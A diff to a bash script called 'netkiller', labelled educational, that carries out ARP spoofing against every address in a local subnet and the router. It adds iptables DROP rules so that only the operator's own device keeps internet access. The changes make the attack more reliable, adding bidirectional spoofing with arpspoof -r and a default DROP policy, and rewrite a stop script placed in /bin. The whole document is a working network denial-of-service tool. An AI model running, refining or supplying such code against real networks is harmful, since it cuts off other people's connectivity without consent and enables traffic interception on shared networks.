@@ -1,7 +1,8 @@
 #!/bin/bash
 
 # ARP Spoofing Internet Blocker (Educational Purposes Only)
-# Targets all possible IPs in subnet (without scanning)                                                                             # Requires: arpspoof, iptables, ipcalc
+# Targets all possible IPs in subnet (without scanning)
+# Requires: arpspoof, iptables, ipcalc
 
 # Check if script is running as root
 if [[ $EUID -ne 0 ]]; then
@@ -24,25 +25,25 @@ echo ""
 
 # Detect Interface
 echo "Enter Wireless Interface: Skip for default"
-read -p "> $WLAN " WLN
+read -r -p "> $WLAN " WLN
 INTERFACE="${WLN:-$WLAN}"
 echo ""
 
 # Detect Gateway IP
 echo "Enter Router Gateway IP: Skip for default"
-read -p "> $GW " INET
+read -r -p "> $GW " INET
 GATEWAY="${INET:-$GW}"
 echo ""
 
 # Detect Subnet
 echo "Enter Subnet mask: Skip for default"
-read -p "> $MASK " IPS
+read -r -p "> $MASK " IPS
 TARGET_SUBNET="${IPS:-$MASK}"
 echo ""
 
 # Detect Device IP
 echo "Enter Device IP: Skip for default"
-read -p "> $IP " DEVIP
+read -r -p "> $IP " DEVIP
 MYIP="${DEVIP:-$IP}"
 echo ""
 
@@ -58,18 +59,21 @@ echo ""
 # Enable IP forwarding
 echo 1 > /proc/sys/net/ipv4/ip_forward
 
-# Flush existing rules
-iptables -t nat -F
-iptables -F FORWARD
-
 # Create stop script
-cat > /bin/netkiller-stop << EOF
+cat > /bin/netkiller-stop << 'EOF'
 #!/bin/sh
 
-iptables -t nat -F
+echo ""
+echo "Netkiller is stopped!"
+echo ""
+ip -s -s neigh flush all >/dev/null 2>&1 &
+iptables -P FORWARD ACCEPT
 iptables -F FORWARD
 pkill -f arpspoof
+pkill -f arping
+sleep 2s
 echo "Restoring the connection..."
+echo ""
 EOF
 chmod 755 /bin/netkiller-stop
 
@@ -81,7 +85,7 @@ expand_subnet() {
 }
 
 # Expand subnet for ARP spoofing
-read HOSTMIN HOSTMAX < <(expand_subnet "$TARGET_SUBNET")
+read -r HOSTMIN HOSTMAX < <(expand_subnet "$TARGET_SUBNET")
 if [[ -n "$HOSTMIN" && -n "$HOSTMAX" ]]; then
     # Convert IPs to integers
     ip2int() {
@@ -93,17 +97,17 @@ if [[ -n "$HOSTMIN" && -n "$HOSTMAX" ]]; then
         local ip=$1
         echo "$((ip>>24&255)).$((ip>>16&255)).$((ip>>8&255)).$((ip&255))"
     }
-    START=$(ip2int $HOSTMIN)
-    END=$(ip2int $HOSTMAX)
+    START=$(ip2int "$HOSTMIN")
+    END=$(ip2int "$HOSTMAX")
     for ((i=START; i<=END; i++)); do
-        TARGET_IP=$(int2ip $i)
-            # Block all the traffic except the DEVICE IP and GATEWAY
-            iptables -I FORWARD ! -s "$MYIP" -d "$GATEWAY" -j DROP
-            iptables -I FORWARD -s "$GATEWAY" ! -d "$MYIP" -j DROP
-        (  
-            arpspoof -i "$INTERFACE" -t "$TARGET_IP" "$GATEWAY" >/dev/null 2>&1 &
-            arpspoof -i "$INTERFACE" -t "$GATEWAY" "$TARGET_IP" >/dev/null 2>&1 &
-            arping -b -A -i "$INTERFACE" -S "$TARGET_IP" "$GATEWAY" >/dev/null 2>&1 &
+        TARGET_IP=$(int2ip "$i")
+        iptables -P FORWARD DROP
+        # Block all the traffic except the DEVICE IP and GATEWAY
+        iptables -I FORWARD ! -s "$MYIP" -d "$GATEWAY" -j DROP
+        iptables -I FORWARD -s "$GATEWAY" ! -d "$MYIP" -j DROP
+        (
+            arpspoof -i "$INTERFACE" -t "$TARGET_IP" -r "$GATEWAY" >/dev/null 2>&1 &
+            arping -b -A -i "$INTERFACE" -S "$GATEWAY" "$TARGET_IP" >/dev/null 2>&1 &
         ) &
     done
 fi
